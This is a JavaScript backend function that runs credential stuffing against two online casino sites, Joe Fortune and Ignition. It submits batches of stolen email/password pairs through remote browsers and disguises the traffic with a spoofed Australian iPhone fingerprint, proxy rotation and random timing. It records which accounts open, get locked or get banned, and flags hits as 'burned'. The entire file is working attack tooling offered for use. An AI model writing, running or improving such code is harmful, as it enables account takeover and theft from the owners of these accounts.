/**
 * Joe Ignite — serverless batch runner.
 * Runs the same logic as the browser orchestrator but entirely inside a Deno
 * backend function: create BB sessions, drive each via CDP WebSocket,
 * classify outcomes, persist JoeIgniteRun records.
 *
 * Frontend polls JoeIgniteRun entity for progress.
 *
 * NOTE: Deno Deploy functions have a ~5-minute execution ceiling. Keep
 * batches modest (<= ~25 credentials at concurrency 4 is a safe rule of thumb).
 * For very large batches, use browser-orchestrated mode.
 */
import { createClientFromRequest } from 'npm:@base44/sdk@0.8.25';

const BB_BASE = 'https://api.browserbase.com/v1';
const MAX_ATTEMPTS = 4;
const AU_MOBILE_INIT_SCRIPT = `
  Object.defineProperty(navigator, 'userAgent', { get: () => 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1' });
  Object.defineProperty(navigator, 'language', { get: () => 'en-AU' });
  Object.defineProperty(navigator, 'languages', { get: () => ['en-AU','en-GB','en'] });
`;

const SITES = {
  joe: {
    url: 'https://www.joefortunepokies.eu/login',
    selectors: { username: '#username', password: '#password', submit: '#loginSubmit' },
  },
  ignition: {
    url: 'https://www.ignitioncasino.ooo/login',
    selectors: { username: '#email', password: '#login-password', submit: '#login-submit' },
  },
};
const COOKIE_SELECTORS = ['.coi-banner__accept', '.coi-banner__close', 'button[onclick*="submitAllCategories"]'];

// ── helpers ────────────────────────────────────────────────────────────────
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const jitter = (a, b) => sleep(a + Math.random() * (b - a));

function classifyOutcome({ url = '', text = '', successBanner = false, loginUrl = '' }) {
  const u = (url || '').toLowerCase();
  const t = (text || '').toLowerCase();
  const login = (loginUrl || '').toLowerCase();
  if (successBanner) return 'SUCCESS';
  if (u && login && u !== login && !u.startsWith(`${login}?`)) return 'SUCCESS';
  if (t.includes('temporarily disabled')) return 'TEMP_LOCK';
  if (t.includes('has been disabled'))    return 'PERM_BAN';
  if (t.includes('incorrect')) return 'CONTINUE';
  return 'CONTINUE';
}

function finalOutcomeFromResults({ joe, ignition }) {
  const values = [joe, ignition];
  if (values.includes('SUCCESS')) return 'SUCCESS';
  if (values.includes('PERM_BAN')) return 'PERM_BAN';
  if (values.includes('TEMP_LOCK')) return 'TEMP_LOCK';
  if (values.every((v) => v === 'ERROR')) return 'ERROR';
  return 'NO_ACCOUNT';
}

async function bbFetch(path, method, apiKey, body) {
  const res = await fetch(`${BB_BASE}${path}`, {
    method,
    headers: { 'X-BB-API-Key': apiKey, 'Content-Type': 'application/json' },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  const data = text ? JSON.parse(text) : {};
  if (!res.ok) throw new Error(`BB ${res.status}: ${text}`);
  return data;
}

// ── CDP client over WebSocket ──────────────────────────────────────────────
class CDP {
  constructor(ws) {
    this.ws = ws;
    this.nextId = 1;
    this.pending = new Map();
    ws.addEventListener('message', (e) => {
      let msg;
      try { msg = JSON.parse(e.data); } catch { return; }
      if (msg.id && this.pending.has(msg.id)) {
        const { resolve, reject } = this.pending.get(msg.id);
        this.pending.delete(msg.id);
        if (msg.error) reject(new Error(msg.error.message));
        else resolve(msg.result);
      }
    });
  }
  send(method, params = {}, sessionId) {
    const id = this.nextId++;
    return new Promise((resolve, reject) => {
      this.pending.set(id, { resolve, reject });
      const payload = { id, method, params };
      if (sessionId) payload.sessionId = sessionId;
      this.ws.send(JSON.stringify(payload));
      setTimeout(() => {
        if (this.pending.has(id)) { this.pending.delete(id); reject(new Error(`timeout ${method}`)); }
      }, 30000);
    });
  }
  close() { try { this.ws.close(); } catch {} }
}

function openCDP(connectUrl) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(connectUrl);
    const t = setTimeout(() => reject(new Error('CDP connect timeout')), 15000);
    ws.addEventListener('open', () => { clearTimeout(t); resolve(new CDP(ws)); });
    ws.addEventListener('error', () => { clearTimeout(t); reject(new Error('CDP connect error')); });
  });
}

async function attach(cdp, targetId) {
  const { sessionId } = await cdp.send('Target.attachToTarget', { targetId, flatten: true });
  return sessionId;
}

async function getOrCreatePage(cdp) {
  const { targetInfos } = await cdp.send('Target.getTargets');
  const existing = targetInfos.find((t) => t.type === 'page');
  if (existing) return existing.targetId;
  const { targetId } = await cdp.send('Target.createTarget', { url: 'about:blank' });
  return targetId;
}

async function navigate(cdp, sessionId, url) {
  await cdp.send('Page.enable', {}, sessionId);
  await cdp.send('Page.navigate', { url }, sessionId);
  await sleep(3000);
}

async function evaluate(cdp, sessionId, expression) {
  const { result } = await cdp.send('Runtime.evaluate', {
    expression, returnByValue: true, awaitPromise: true,
  }, sessionId);
  return result?.value;
}

async function dismissCookies(cdp, sessionId) {
  const expr = `(() => {
    const sels = ${JSON.stringify(COOKIE_SELECTORS)};
    for (const s of sels) { const el = document.querySelector(s); if (el) { el.click(); return true; } }
    return false;
  })()`;
  try { await evaluate(cdp, sessionId, expr); } catch {}
  await jitter(300, 600);
}

async function fillAndSubmit(cdp, sessionId, selectors, email, password, overwrite) {
  const fill = `(() => {
    const set = (sel, val) => {
      const el = document.querySelector(sel);
      if (!el) return false;
      const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      el.focus();
      if (${overwrite}) { el.select?.(); }
      setter.call(el, val);
      el.dispatchEvent(new Event('input',  { bubbles: true }));
      el.dispatchEvent(new Event('change', { bubbles: true }));
      return true;
    };
    set(${JSON.stringify(selectors.username)}, ${JSON.stringify(email)});
    set(${JSON.stringify(selectors.password)}, ${JSON.stringify(password)});
    return true;
  })()`;
  await evaluate(cdp, sessionId, fill);
  await jitter(60, 140);
  const submit = `(() => { const b = document.querySelector(${JSON.stringify(selectors.submit)}); if (b) { b.click(); return true; } return false; })()`;
  await evaluate(cdp, sessionId, submit);
}

async function readState(cdp, sessionId) {
  const expr = `({
    url: location.href,
    text: (document.body && document.body.innerText || '').slice(0, 8000),
    successBanner: !!document.querySelector('.ol-alert__content.ol-alert__content--status_success'),
  })`;
  return (await evaluate(cdp, sessionId, expr)) || { url: '', text: '', successBanner: false };
}

// Poll the page every 200ms until a definitive outcome appears or the cap is hit.
// First attempt gets 7s cap (site can be slow to respond); retries get 3s.
async function waitForOutcome(cdp, sessionId, attempt) {
  const maxWait = attempt === 1 ? 7000 : 3000;
  const deadline = Date.now() + maxWait;
  let last = { url: '', text: '', successBanner: false };
  while (Date.now() < deadline) {
    last = await readState(cdp, sessionId);
    const o = classifyOutcome(last);
    if (o !== 'CONTINUE') return o;
    await sleep(200);
  }
  return classifyOutcome(last);
}

// ── process one credential ─────────────────────────────────────────────────
async function processCredential({ cred, batchId, apiKey, projectId, base44, proxy, proxySource, auMobile }) {
  const rowPatch = {
    batchId, email: cred.email, status: 'running',
    attempts: 0, startedAt: new Date().toISOString(),
  };
  const existing = await base44.asServiceRole.entities.JoeIgniteRun.filter({ batchId, email: cred.email });
  const rowId = existing[0]?.id;
  if (rowId) await base44.asServiceRole.entities.JoeIgniteRun.update(rowId, rowPatch);

  let sessionId = null;
  let results = { joe: null, ignition: null };
  let attempts = 0;
  let status = 'error';
  const details = [];

  try {
    const sessionBody = {
      projectId,
      region: auMobile ? 'ap-southeast-1' : undefined,
      browserSettings: auMobile
        ? { viewport: { width: 390, height: 844 }, fingerprint: { devices: ['mobile'], locales: ['en-AU', 'en-GB', 'en'] } }
        : { viewport: { width: 1366, height: 768 } },
      userMetadata: { launchedFrom: 'BBCommandCenter', testRun: 'joe_ignite', task: 'login-verify', email: cred.email, batchId, proxySource, proxyId: proxy?.id, auMobile },
    };
    if (proxySource === 'bb-au') {
      sessionBody.proxies = [{ type: 'browserbase', geolocation: { country: 'AU' } }];
    } else if (proxy) {
      const p = { type: 'external', server: proxy.server };
      if (proxy.username) p.username = proxy.username;
      if (proxy.password) p.password = proxy.password;
      sessionBody.proxies = [p];
    }
    const session = await bbFetch('/sessions', 'POST', apiKey, sessionBody);
    sessionId = session.id;
    if (rowId) await base44.asServiceRole.entities.JoeIgniteRun.update(rowId, { sessionId });

    const cdp = await openCDP(session.connectUrl);
    try {
      const joeTargetId = await getOrCreatePage(cdp);
      const { targetId: ignTargetId } = await cdp.send('Target.createTarget', { url: 'about:blank' });
      const joeSess = await attach(cdp, joeTargetId);
      const ignSess = await attach(cdp, ignTargetId);
      if (auMobile) {
        for (const sess of [joeSess, ignSess]) {
          await cdp.send('Page.enable', {}, sess);
          await cdp.send('Page.addScriptToEvaluateOnNewDocument', { source: AU_MOBILE_INIT_SCRIPT }, sess);
          await cdp.send('Network.enable', {}, sess);
          await cdp.send('Network.setExtraHTTPHeaders', { headers: { 'Accept-Language': 'en-AU,en-GB;q=0.9,en;q=0.8' } }, sess);
        }
      }

      const run = async (siteKey, sess, attempt) => {
        const cfg = SITES[siteKey];
        try {
          if (attempt === 1) {
            await navigate(cdp, sess, cfg.url);
            await dismissCookies(cdp, sess);
            await jitter(300, 600);
          }
          await fillAndSubmit(cdp, sess, cfg.selectors, cred.email, cred.password, attempt > 1);
          return await waitForOutcome(cdp, sess, attempt);
        } catch { return 'ERROR'; }
      };

      for (attempts = 1; attempts <= MAX_ATTEMPTS; attempts++) {
        const [joeRes, ignRes] = await Promise.all([
          run('joe', joeSess, attempts),
          run('ignition', ignSess, attempts),
        ]);
        results = { joe: joeRes, ignition: ignRes };
        details.push(`Attempt ${attempts}: joe=${joeRes} ign=${ignRes}`);
        if (rowId) await base44.asServiceRole.entities.JoeIgniteRun.update(rowId, {
          attempts, joeOutcome: joeRes, ignitionOutcome: ignRes,
        });
        if (['SUCCESS', 'PERM_BAN', 'TEMP_LOCK'].some((o) => joeRes === o || ignRes === o)) break;
        if (attempts < MAX_ATTEMPTS) await jitter(2000, 3000);
      }
    } finally {
      cdp.close();
    }

    status = finalOutcomeFromResults(results).toLowerCase();
  } catch (err) {
    details.push(`FATAL: ${err.message}`);
    status = 'error';
  } finally {
    if (sessionId) { try { await bbFetch(`/sessions/${sessionId}`, 'POST', apiKey, { projectId, status: 'REQUEST_RELEASE' }); } catch {} }
  }

  const isBurned = status === 'success' || status === 'perm_ban';
  const finalPatch = {
    sessionId, status, attempts,
    joeOutcome: results.joe, ignitionOutcome: results.ignition,
    isBurned, details: details.join(' | '),
    endedAt: new Date().toISOString(),
  };
  if (rowId) await base44.asServiceRole.entities.JoeIgniteRun.update(rowId, finalPatch);
  else await base44.asServiceRole.entities.JoeIgniteRun.create({ batchId, email: cred.email, ...finalPatch });

  // Update proxy usage stats
  if (proxy?.id) {
    const isSuccess = status === 'success';
    try {
      await base44.asServiceRole.entities.ProxyPool.update(proxy.id, {
        timesUsed: (proxy.timesUsed || 0) + 1,
        successCount: (proxy.successCount || 0) + (isSuccess ? 1 : 0),
        failureCount: (proxy.failureCount || 0) + (isSuccess ? 0 : 1),
        lastUsedAt: new Date().toISOString(),
      });
    } catch {}
  }
}

// ── handler ────────────────────────────────────────────────────────────────
Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const user = await base44.auth.me();
    if (!user) return Response.json({ error: 'Unauthorized' }, { status: 401 });

    const { credentials, concurrency = 4, batchId, projectId, proxySource = 'bb-au', auMobile = true } = await req.json();
    const apiKey = Deno.env.get('Api_key');
    if (!apiKey) return Response.json({ error: 'Api_key secret not configured' }, { status: 400 });
    if (!projectId) return Response.json({ error: 'projectId required' }, { status: 400 });
    if (!Array.isArray(credentials) || credentials.length === 0) {
      return Response.json({ error: 'credentials required' }, { status: 400 });
    }

    // Pre-create all rows as "queued" so the frontend can see them immediately.
    await Promise.all(credentials.map((c) =>
      base44.asServiceRole.entities.JoeIgniteRun.create({
        batchId, email: c.email, status: 'queued', attempts: 0,
      })
    ));

    // Load external proxy pool only when selected
    let proxyPool = [];
    if (proxySource === 'pool') {
      const all = await base44.asServiceRole.entities.ProxyPool.list('-created_date', 500);
      proxyPool = all.filter((p) => p.enabled !== false && p.server);
    }
    let proxyCursor = 0;
    const nextProxy = () => {
      if (proxyPool.length === 0) return null;
      const p = proxyPool[proxyCursor % proxyPool.length];
      proxyCursor++;
      return p;
    };

    // Return immediately so the client isn't blocked; run workers in background.
    const queue = credentials.map((c) => ({
      cred: c,
      proxy: proxySource === 'pool' ? nextProxy() : null,
    }));
    const workers = Array.from({ length: Math.max(1, Math.min(concurrency, 8)) }, async () => {
      while (queue.length) {
        const item = queue.shift();
        if (!item) return;
        try { await processCredential({ cred: item.cred, batchId, apiKey, projectId, base44, proxy: item.proxy, proxySource, auMobile }); }
        catch (err) { console.error(`row failed ${item.cred.email}: ${err.message}`); }
      }
    });

    // Fire-and-forget (Deno keeps it alive until all resolve or function times out).
    Promise.all(workers).catch((e) => console.error('batch error', e));

    return Response.json({ ok: true, batchId, queued: credentials.length });
  } catch (err) {
    return Response.json({ error: err.message }, { status: 500 });
  }
});